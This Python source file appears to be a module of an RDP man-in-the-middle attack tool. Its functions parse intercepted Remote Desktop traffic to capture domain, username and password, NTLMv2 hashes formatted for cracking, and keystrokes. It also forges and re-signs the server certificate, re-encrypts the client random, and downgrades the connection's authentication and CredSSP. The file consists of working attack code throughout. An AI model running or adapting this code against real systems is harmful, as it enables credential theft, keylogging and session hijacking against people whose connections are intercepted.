from binascii import hexlify, unhexlify

import re
import struct

from seth.args import args, hexdump
from seth.consts import SCANCODE, KBD_LAYOUT_CNTRY
from seth.crypto import *

def substr(s, offset, count):
    return s[offset:offset+count]


def extract_ntlmv2(bytes, m):
    # References:
    #  - [MS-NLMP].pdf
    #  - https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf
    offset = len(m.group())//2
    keys = ["lmstruct", "ntstruct", "domain", "user", "workstation",
            "encryption_key"]
    fields = [bytes[offset+i*8:offset+(i+1)*8] for i in range(len(keys))]
    field_offsets = [struct.unpack('<I', x[4:])[0] for x in fields]
    field_lens = [struct.unpack('<H', x[:2])[0] for x in fields]
    payload = bytes[offset+76:]

    values = {}
    for i,length in enumerate(field_lens):
        thisoffset = offset - 12 + field_offsets[i]
        values[keys[i]] = bytes[thisoffset:thisoffset+length]

    nt_response = values["ntstruct"][:16]
    jtr_string = values["ntstruct"][16:]

    hash = b"%s::%s:%s:%s:%s" % (
                 values["user"].decode('utf-16').encode(),
                 values["domain"].decode('utf-16').encode(),
                 b"%s", # hexlify(server_challenge),
                 hexlify(nt_response),
                 hexlify(jtr_string),
         )

    return {
        "nt_response": nt_response,
        "jtr_string": jtr_string,
        "hash_wo_server_challenge": hash,
    }


def extract_server_challenge(bytes, m):
    offset = len(m.group())//2+12
    server_challenge = bytes[offset:offset+8]
    return {"server_challenge": server_challenge}


def extract_server_cert(bytes):
    # Reference: [MS-RDPBCGR].pdf from 2010, v20100305
    m2 = re.match(b".*010c.*030c.*020c", hexlify(bytes))
    offset = len(m2.group())//2
    size = struct.unpack('<H', substr(bytes, offset, 2))[0]
    encryption_method, encryption_level, server_random_len, server_cert_len = (
        struct.unpack('<IIII', substr(bytes, offset+2, 16))
    )
    server_random = substr(bytes, offset+18, server_random_len)
    server_cert = substr(bytes, offset+18+server_random_len,
                         server_cert_len)

    #  cert_version = struct.unpack('<I', server_cert[:4])[0]
        # 1 = Proprietary
        # 2 = x509
        # TODO ignore right most bit

    dwVersion, dwSigAlg, dwKeyAlg = struct.unpack('<III',
                                                  substr(server_cert, 0, 12))

    pubkey_type, pubkey_len = struct.unpack('<HH', substr(server_cert, 12, 4))
    pubkey = substr(server_cert, 16, pubkey_len)
    assert pubkey[:4] == b"RSA1"

    sign_type = struct.unpack('<H', substr(server_cert, 16+pubkey_len, 2))[0]
    sign_len = struct.unpack('<H', substr(server_cert, 18+pubkey_len, 2))[0]
    sign = substr(server_cert, 20+pubkey_len, sign_len)

    key_len, bit_len = struct.unpack('<II', substr(pubkey, 4, 8))
    assert bit_len == key_len * 8 - 64
    data_len, pub_exp = struct.unpack('<II', substr(pubkey, 12, 8))
    modulus = substr(pubkey, 20, key_len)

    first5fields = struct.pack("<IIIHH",
                    dwVersion,
                    dwSigAlg,
                    dwKeyAlg,
                    pubkey_type,
                    pubkey_len )
    crypto = {"modulus": modulus,
             "pub_exponent": pub_exp,
             "data_len": data_len,
             "server_rand": server_random, # little endian
             "sign": sign,
             "first5fields": first5fields,
             "pubkey_blob": pubkey,
             "client_rand": b"",
    }
    crypto["pubkey"] = {
        "modulus": int.from_bytes(modulus, "little"),
        "publicExponent": pub_exp,
    }

    return {"crypto": crypto}


def extract_client_random(bytes, crypto):
    for i in range(7,len(bytes)-4):
        rand_len = bytes[i:i+4]
        if struct.unpack('<I', rand_len)[0] == len(bytes)-i-4:
            client_rand = bytes[i+4:]
            crypto["enc_client_rand"] = client_rand
            client_rand = rsa_decrypt(client_rand, crypto["mykey"])
            crypto["client_rand"] = client_rand
            generate_session_keys(crypto)
            crypto.update({"client_rand": client_rand})
    return {"crypto": crypto}




def extract_credentials(bytes, m, standard_rdp_sec=False):
    # Client Info PDU
    # "0x0040 MUST be present"

    if standard_rdp_sec:
        domlen, userlen, pwlen = [
            struct.unpack('<H', unhexlify(x))[0]
            for x in m.groups()
        ]
        offset = len(m.group(0))//2
    else:
        domlen, userlen, pwlen = [
            struct.unpack('>H', unhexlify(x))[0]
            for x in m.groups()
        ]
        offset = 37
    if domlen + userlen + pwlen < len(bytes):
        domain = substr(bytes, offset, domlen).decode("utf-16")
        if domain == "":
            domain = "."
        user = substr(bytes, offset+domlen+2, userlen).decode("utf-16")
        pw = substr(bytes, offset+domlen+2+userlen+2, pwlen).decode("utf-16")
        creds = b"%s\\%s:%s" % (domain.encode(), user.encode(), pw.encode())
        return {"creds": creds}
    else:
        return {}


def extract_keyboard_layout(bytes, m):
    length = struct.unpack('<H', unhexlify(m.groups()[0]))[0]
    offset = len(m.group())//2 - length + 8
    keyboard_info = {
        "layout": struct.unpack("<I", substr(bytes, offset, 4))[0],
        "type": struct.unpack("<I", substr(bytes, offset+4, 4))[0],
        "subtype": struct.unpack("<I", substr(bytes, offset+8, 4))[0],
        "funckey": struct.unpack("<I", substr(bytes, offset+12, 4))[0]
    }
    return {
        "keyboard_layout": keyboard_info["layout"],
        "keyboard_type": keyboard_info["type"],
        "keyboard_subtype": keyboard_info["subtype"],
    }


def translate_keycode(key):
    # TODO find key wrt to locale and kbd type
    try:
        return SCANCODE[key]
    except:
        return None


def extract_key_press(bytes):
    result = b""
    if is_fast_path(bytes):
        event = bytes[-2]
        key = bytes[-1]
        key = translate_keycode(key)
        if event %2 == 0 and key:
            result += b"Key press:   %s\n" % key.encode()
        elif event % 2 == 1 and key:
            result += b"Key release:                 %s\n" % key.encode()
        if event > 1 and key:
            result += extract_key_press(
                b"\x44%c%s" % (len(bytes)-2, bytes[2:-2])
            ) + b"\n"
    elif len(bytes) == 2:
        event = bytes[0]
        key = bytes[1]
        key = translate_keycode(key)
        if event == 1 and key:
            result += b"Key release:                 %s\n" % key.encode()
        elif key:
            result += b"Key press:   %s\n" % key.encode()
    else:
        event = bytes[-5]
        key = bytes[-4]
        key = translate_keycode(key)
        if event & 0x80 and key:
            result += b"Key release:                 %s\n" % key.encode()
        elif key:
            result += b"Key press:   %s\n" % key.encode()
    return result[:-1]


def replace_server_cert(bytes, crypto):
    old_sig = sign_certificate(crypto["first5fields"] +
                               crypto["pubkey_blob"],
                               len(crypto["sign"]))
    assert old_sig == crypto["sign"]
    key_len = len(crypto["modulus"])-8
    crypto["mykey"] = generate_rsa_key(key_len*8)
    new_modulus = crypto["mykey"]["modulus"].to_bytes(key_len + 8, "little")
    old_modulus = crypto["modulus"]
    result = bytes.replace(old_modulus, new_modulus)
    new_pubkey_blob = crypto["pubkey_blob"].replace(old_modulus,
                                                    new_modulus)
    new_sig = sign_certificate(crypto["first5fields"] + new_pubkey_blob,
                               len(crypto["sign"]))
    result = result.replace(crypto["sign"], new_sig)

    return result


def parse_rdp(bytes, vars, From="Client"):
    result = {}
    if len(bytes) > 2:
        if bytes[:2] == b"\x03\x00":
            length = struct.unpack('>H', bytes[2:4])[0]
            result.update(parse_rdp_packet(bytes[:length], vars, From=From))
            result.update(parse_rdp(bytes[length:], vars, From=From))
        elif bytes[0] == 0x30:
            length = bytes[1]
            pad = 2
            if length >= 0x80:
                length_bytes = length - 0x80
                length = int.from_bytes(bytes[2:2+length_bytes], byteorder='big')
                pad = 2 + length_bytes
            result.update(parse_rdp_packet(bytes[:length+pad], vars, From=From))
            result.update(parse_rdp(bytes[length+pad:], vars, From=From))
        elif bytes[0] % 4 == 0: #fastpath
            length = bytes[1]
            if length >= 0x80:
                length = struct.unpack('>H', bytes[1:3])[0]
                length -= 0x80*0x100
            result.update(parse_rdp_packet(bytes[:length], vars, From=From))
            result.update(parse_rdp(bytes[length:], vars, From=From))
    return result


def parse_rdp_packet(bytes, vars=None, From="Client"):

    if len(bytes) < 4: return b""

    if "crypto" in vars and sym_encryption_enabled(vars["crypto"]):
        bytes = decrypt(bytes, From=From)

    result = {}
    # hexlify first because \x0a is a line break and regex works on single
    # lines

    # get creds if standard rdp security
    regex = b".*0{8}3b010000(.{4})(.{4})(.{4})0{8}"
    m = re.match(regex, hexlify(bytes))
    if m:
        try:
            result.update(extract_credentials(bytes, m, standard_rdp_sec=True))
        except:
            pass


    # get creds otherwise
    # "0x0040 MUST be present"
    regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
    m = re.match(regex, hexlify(bytes))
    if m:
        try:
            result.update(extract_credentials(bytes, m))
        except:
            pass


    regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
    m = re.match(regex, hexlify(bytes))
    if m:
        result.update(extract_server_challenge(bytes, m))

    regex = b".*%s0003000000" % hexlify(b"NTLMSSP")
    m = re.match(regex, hexlify(bytes))
    if m:
        result.update(extract_ntlmv2(bytes, m))

    if "crypto" in vars and "client_rand" in vars["crypto"]:
        regex = b".{14,}01.*0{16}"
        m = re.match(regex, hexlify(bytes))
        if m and vars["crypto"]["client_rand"] == b"":
            client_rand = extract_client_random(bytes, vars["crypto"])
            result.update(client_rand)

    regex = b".*020c.*%s" % hexlify(b"RSA1")
    m = re.match(regex, hexlify(bytes))
    if m:
        result.update(extract_server_cert(bytes))

    regex = b".*0d00(.{4}).{164}0000"
    m = re.match(regex, hexlify(bytes))
    if m and From == "Client":
        # A parsing error here shouldn't be a show stopper, so catch exceptions
        try:
            result.update(extract_keyboard_layout(bytes, m))
        except:
            print("Failed to extract keyboard layout information")

    regex = b"0300.*0400.{12}$"
    m = re.match(regex, hexlify(bytes))
    if result == {} and ( # TODO: ~bytes[-3] & 1 (2.2.8.1.2.2.1)
        len(bytes)>3 and len(bytes) <= 8 and bytes[-2] in [0,1] or
        m
    ):
        keypress = extract_key_press(bytes)
        if keypress:
            print("\033[31m%s\033[0m" % keypress.decode())

    # keyboard events in standard rdp
    regex = b"^0[01]..$"
    m = re.match(regex, hexlify(bytes))
    if result == {} and m:
        keypress = extract_key_press(bytes)
        if keypress:
            print("\033[31m%s\033[0m" % keypress.decode())

    return result


def tamper_data(bytes, vars, From="Client"):
    result = bytes

    if "crypto" in vars and "client_rand" in vars["crypto"]:
        regex = b".{14,}01.*0{16}"
        m = re.match(regex, hexlify(bytes))
        if m and not vars["crypto"]["client_rand"] == b"":
            result = reencrypt_client_random(vars["crypto"], bytes)

    regex = b".*020c.*%s" % hexlify(b"RSA1")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = replace_server_cert(bytes, vars["crypto"])

    regex = b".*%s..010c" % hexlify(b"McDn")
    m = re.match(regex, hexlify(bytes))
    if m:
        result = set_fake_requested_protocol(bytes, m, vars["RDP_PROTOCOL_OLD"])


    if "nt_response" in vars:
        regex = b".*%s0003000000.*%s" % (
            hexlify(b"NTLMSSP"),
            hexlify(vars["nt_response"])
        )
        m = re.match(regex, hexlify(bytes))
        if m and vars["RDP_PROTOCOL"] > 2:
            result = tamper_nt_response(bytes, vars)

    if (From == "Server" and "server_challenge" in vars):
        regex = b"30..a0.*6d"
        m = re.match(regex, hexlify(bytes))
        if m:
            print("Downgrading CredSSP")
            result = unhexlify(b"300da003020104a4060204c000005e")


    if not result == bytes and args.debug:
        dump_data(result, From=From, Modified=True)

    return result


def tamper_nt_response(data, vars):
    """The connection is sometimes terminated if NTLM is successful, this prevents that"""
    print("Tamper with NTLM response")
    nt_response = vars["nt_response"]
    fake_response = bytes([(nt_response[0] + 1 ) % 0xFF]) + nt_response[1:]
    return data.replace(nt_response, fake_response)


def set_fake_requested_protocol(data, m, rdp_protocol):
    print("Hiding forged protocol request from client")
    offset = len(m.group())//2
    result = data[:offset+6] + bytes([rdp_protocol]) + data[offset+7:]
    return result


def downgrade_auth(bytes):
    #  regex = b".*..00..00.{8}$" # TODO regex necessary? if not, remove
    #  m = re.match(regex, hexlify(bytes))
    # Flags:
    # 0: standard rdp security
    # 1: TLS
    # 2: CredSSP (NTLMv2 or Kerberos)
    # 8: Early User Authorization
    #  if m and RDP_PROTOCOL > args.downgrade: # TODO see above
    RDP_PROTOCOL = bytes[-4]
    if RDP_PROTOCOL > args.downgrade:
        print("Downgrading authentication options from %d to %d" %
              (RDP_PROTOCOL, args.downgrade))
        RDP_PROTOCOL = args.downgrade
        result = (
            bytes[:-7] +
            b"\x00\x08\x00" +
            chr(RDP_PROTOCOL).encode() +
            b"\x00\x00\x00"
        )
        dump_data(result, From="Client", Modified=True)
        return result
    return bytes


def dump_data(data, From=None, Modified=False):
    if args.debug:
        modified = ""
        if Modified:
            modified = " (modified)"
        if From == "Server":
            print("From server:"+modified)
        elif From == "Client":
            print("From client:"+modified)

        hexdump(data)


def print_var(k, vars):
    if k == "hash_wo_server_challenge":
        result = (vars[k] % hexlify(vars["server_challenge"]))
    elif k == "creds":
        result = vars[k]
    #  elif k == "server_challenge":
    #      result = b"Server Challenge: %s" % hexlify(vars[k])
    elif k == "keyboard_layout":
        try:
            result = b"Keyboard Layout: 0x%x (%s)" % (vars[k],
                                                KBD_LAYOUT_CNTRY[vars[k]])
        except KeyError:
            result = b"Keyboard Layout not recognized"
    else:
        try:
            result = b"%s: %s" % (k.encode(), str(vars[k]).encode)
        except:
            result = b""
    if result:
        print("\033[31m%s\033[0m" % result.decode())

